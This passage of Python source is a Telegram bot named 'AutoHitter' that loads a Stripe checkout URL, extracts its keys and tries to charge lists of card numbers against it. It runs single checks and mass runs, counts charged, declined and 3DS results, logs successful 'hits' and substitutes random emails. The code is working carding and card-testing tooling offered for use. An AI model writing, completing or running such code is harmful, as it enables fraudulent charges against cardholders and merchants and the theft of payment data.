        "📋 <b>AUTOHITTER COMMANDS</b>\n"
        "━━━━━━━━━━━━━━━\n\n"
        "1️⃣ /ah <code>&lt;url&gt;</code> — Load Stripe checkout URL\n"
        "   <i>Example:</i> <code>/ah https://checkout.stripe.com/...</code>\n\n"
        "2️⃣ /chk <code>&lt;cc|mm|yy|cvv&gt;</code> — Hit a single card\n"
        "   <i>Example:</i> <code>/chk 4111111111111111|12|26|123</code>\n\n"
        "3️⃣ /mass — Start mass card hit\n"
        "   <i>Send card list after this command (one per line)</i>\n\n"
        "4️⃣ /info — Show loaded checkout info\n\n"
        "5️⃣ /stop — Stop ongoing mass hit\n\n"
        "━━━━━━━━━━━━━━━\n"
        "💡 <b>Card Format:</b> <code>cc|mm|yy|cvv</code>"
    )

async def cmd_ah(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not context.args:
        await safe_send(update, "⚠️ Usage: /ah <code>&lt;checkout_url&gt;</code>")
        return
    url = " ".join(context.args).strip()
    extracted = extract_checkout_url(url) or url
    prog_msg = await safe_send(update, "⏳ <b>Loading checkout...</b>\n🔍 Extracting PK/CS from URL...")
    checkout_data = await get_checkout_info(extracted)
    checkout_data["checkout_url"] = extracted
    if checkout_data.get("error"):
        await safe_edit(prog_msg, f"❌ <b>Failed to load checkout</b>\n⚠️ {esc(checkout_data['error'])}")
        return
    user_sessions[uid] = {"checkout_data": checkout_data, "waiting_mass": False, "stop_mass": False}
    pk = checkout_data.get("pk") or "N/A"
    cs = checkout_data.get("cs") or "N/A"
    price = checkout_data.get("price")
    currency = checkout_data.get("currency", "USD")
    price_str = f"{currency} {price:.2f}" if price is not None else "N/A"
    email_disp = esc(checkout_data.get("email")) if checkout_data.get("email") else "<i>None → random will be assigned</i>"
    confirm_disp = esc(checkout_data.get("confirm_url")) if checkout_data.get("confirm_url") else "N/A"
    await safe_edit(prog_msg,
        f"━━━━━━━━━━━━━━━\n"
        f"✅ <b>CHECKOUT LOADED</b>\n"
        f"━━━━━━━━━━━━━━━\n\n"
        f"<b>Merchant:</b> {esc(checkout_data.get('merchant', 'Unknown'))}\n"
        f"<b>Email:</b> {email_disp}\n"
        f"<b>Amount:</b> {esc(price_str)}\n"
        f"<b>ConfirmUrl:</b> {confirm_disp}\n"
        f"<b>PK:</b> <code>{esc(pk[:30])}...</code>\n"
        f"<b>CS:</b> <code>{esc(cs[:30])}...</code>\n\n"
        f"━━━━━━━━━━━━━━━\n"
        f"💡 Use /chk or /mass to hit cards"
    )

async def cmd_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    session = user_sessions.get(uid)
    if not session or not session.get("checkout_data"):
        await safe_send(update, "⚠️ No checkout loaded. Use /ah first.")
        return
    co = session["checkout_data"]
    pk = co.get("pk") or "N/A"
    cs = co.get("cs") or "N/A"
    price = co.get("price")
    currency = co.get("currency", "USD")
    price_str = f"{currency} {price:.2f}" if price is not None else "N/A"
    email_disp = esc(co.get("email")) if co.get("email") else "<i>None → random will be assigned</i>"
    confirm_disp = esc(co.get("confirm_url")) if co.get("confirm_url") else "N/A"
    await safe_send(update,
        f"━━━━━━━━━━━━━━━\n"
        f"📋 <b>CHECKOUT INFO</b>\n"
        f"━━━━━━━━━━━━━━━\n\n"
        f"<b>Merchant:</b> {esc(co.get('merchant', 'Unknown'))}\n"
        f"<b>Email:</b> {email_disp}\n"
        f"<b>Amount:</b> {esc(price_str)}\n"
        f"<b>ConfirmUrl:</b> {confirm_disp}\n"
        f"<b>PK:</b> <code>{esc(pk[:30])}...</code>\n"
        f"<b>CS:</b> <code>{esc(cs[:30])}...</code>\n"
        f"━━━━━━━━━━━━━━━"
    )

async def cmd_chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    session = user_sessions.get(uid)
    if not session or not session.get("checkout_data"):
        await safe_send(update, "⚠️ No checkout loaded. Use /ah first.")
        return
    if not context.args:
        await safe_send(update,
            "⚠️ Usage: /chk <code>cc|mm|yy|cvv</code>\n"
            "<i>Example:</i> <code>/chk 4111111111111111|12|26|123</code>"
        )
        return
    cc_str = " ".join(context.args).strip()
    card = parse_card(cc_str)
    if not card:
        await safe_send(update, "❌ Invalid card format.\n<i>Use:</i> <code>cc|mm|yy|cvv</code>")
        return
    card_display = f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}"
    prog_msg = await safe_send(update,
        f"⏳ <b>Processing...</b>\n<code>{esc(card_display)}</code>\n🔄 Tokenizing card..."
    )
    checkout_data = session["checkout_data"]
    if not checkout_data.get("email"):
        checkout_data["used_email"] = random_email()
    result = await charge_card(card, checkout_data)
    bin_info = get_bin_info(card['cc'])
    if result["status"] == "CHARGED":
        record_hit(update.effective_user, card_display, checkout_data, bin_info, result, "/chk")
        msg = fmt_charged(card_display, checkout_data, bin_info, result)
    else:
        msg = fmt_declined_chk(card_display, result["status"], result["response"], bin_info, result["time"])
    await safe_edit(prog_msg, msg)

async def cmd_mass(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    session = user_sessions.get(uid)
    if not session or not session.get("checkout_data"):
        await safe_send(update, "⚠️ No checkout loaded. Use /ah first.")
        return
    user_sessions[uid]["waiting_mass"] = True
    user_sessions[uid]["stop_mass"] = False
    await safe_send(update,
        "━━━━━━━━━━━━━━━\n"
        "📋 <b>MASS HIT MODE</b>\n"
        "━━━━━━━━━━━━━━━\n\n"
        "📤 <b>Send your card list now</b>\n"
        "<i>(one per line: cc|mm|yy|cvv)</i>\n\n"
        "💡 /stop to cancel anytime."
    )

async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid in user_sessions:
        user_sessions[uid]["stop_mass"] = True
        user_sessions[uid]["waiting_mass"] = False
    await safe_send(update, "🛑 <b>Stopping after current card...</b>")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    session = user_sessions.get(uid)
    if not session or not session.get("waiting_mass"):
        return
    text = update.message.text.strip()
    cards_raw = [line.strip() for line in text.split('\n') if line.strip()]
    valid_cards = [(line, parse_card(line)) for line in cards_raw if parse_card(line)]
    if not valid_cards:
        await safe_send(update, "❌ No valid cards found.\n<i>Format:</i> <code>cc|mm|yy|cvv</code>")
        return

    user_sessions[uid]["waiting_mass"] = False
    checkout_data = session["checkout_data"]
    if not checkout_data.get("email"):
        checkout_data["used_email"] = random_email()

    total = len(valid_cards)
    charged = declined = threed = errors = 0
    log_lines = []
    MAX_LOG = 8

    status_msg = await safe_send(update,
        f"━━━━━━━━━━━━━━━\n"
        f"🚀 <b>MASS HIT STARTED</b> — {total} cards\n"
        f"━━━━━━━━━━━━━━━\n\n"
        f"⏳ Processing card 0/{total}...\n\n"
        f"✅ <b>0</b>  ❌ <b>0</b>  🔐 <b>0</b>  ⚠️ <b>0</b>"
    )

    async def update_status(current_i, current_card_disp=None):
        log_section = "\n".join(log_lines[-MAX_LOG:]) if log_lines else ""
        card_line = f"\n💳 <code>{esc(current_card_disp)}</code>" if current_card_disp else ""
        text = (
            f"━━━━━━━━━━━━━━━\n"
            f"🔄 <b>MASS HIT</b> — {current_i}/{total}{card_line}\n"
            f"━━━━━━━━━━━━━━━\n\n"
            f"✅ <b>{charged}</b> Charged  ❌ <b>{declined}</b> Declined  🔐 <b>{threed}</b> 3DS  ⚠️ <b>{errors}</b> Err\n\n"
            + (f"<b>Results:</b>\n{log_section}" if log_section else "")
        )
        await safe_edit(status_msg, text)

    for i, (cc_str, card) in enumerate(valid_cards, 1):
        if user_sessions.get(uid, {}).get("stop_mass"):
            break
        card_display = f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}"
        await update_status(i, card_display)
        result = await charge_card(card, checkout_data)
        bin_info = get_bin_info(card['cc'])
        if result["status"] == "CHARGED":
            charged += 1
            record_hit(update.effective_user, card_display, checkout_data, bin_info, result, "/mass")
            await safe_send(update, fmt_charged(card_display, checkout_data, bin_info, result))
            log_lines.append(f"✅ <code>{esc(card_display)}</code> — Charged! ({result['time']}s)")
        elif result["status"] == "3DS":
            threed += 1
            log_lines.append(fmt_declined_line(card_display, result["status"], result["response"], bin_info, result["time"]))
        elif result["status"] == "ERROR":
            errors += 1
            log_lines.append(fmt_declined_line(card_display, result["status"], result["response"], bin_info, result["time"]))
        else:
            declined += 1
            log_lines.append(fmt_declined_line(card_display, result["status"], result["response"], bin_info, result["time"]))

    stopped = user_sessions.get(uid, {}).get("stop_mass", False)
    final_log = "\n".join(log_lines[-MAX_LOG:]) if log_lines else ""
    await safe_edit(status_msg,
        f"━━━━━━━━━━━━━━━\n"
        f"{'🛑' if stopped else '✅'} <b>MASS HIT {'STOPPED' if stopped else 'COMPLETE'}</b>\n"
        f"━━━━━━━━━━━━━━━\n\n"
        f"📊 <b>Processed:</b> {min(len(valid_cards), charged+declined+threed+errors)}/{total}\n"
        f"✅ <b>Charged:</b> {charged}\n"
        f"❌ <b>Declined:</b> {declined}\n"
        f"🔐 <b>3DS:</b> {threed}\n"
        f"⚠️ <b>Errors:</b> {errors}\n"
        + (f"\n<b>Last results:</b>\n{final_log}\n" if final_log else "")
        + f"\n━━━━━━━━━━━━━━━\n"
        f"<b>Gateway:</b> Stripe Co (Beta) | <b>Dev:</b> Zangi"
    )

# ─────────────────────────────────────────────────────────────────────────────
# ENTRY POINT — runs both admin server + bot simultaneously
# ─────────────────────────────────────────────────────────────────────────────

def main():
    # Start the admin dashboard in a background thread
    t = threading.Thread(target=start_admin_server, daemon=True)
    t.start()

    # Start the Telegram bot (blocking)
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("ah", cmd_ah))
    app.add_handler(CommandHandler("info", cmd_info))
    app.add_handler(CommandHandler("chk", cmd_chk))
    app.add_handler(CommandHandler("mass", cmd_mass))
    app.add_handler(CommandHandler("stop", cmd_stop))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    print("AutoHitter Bot started...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
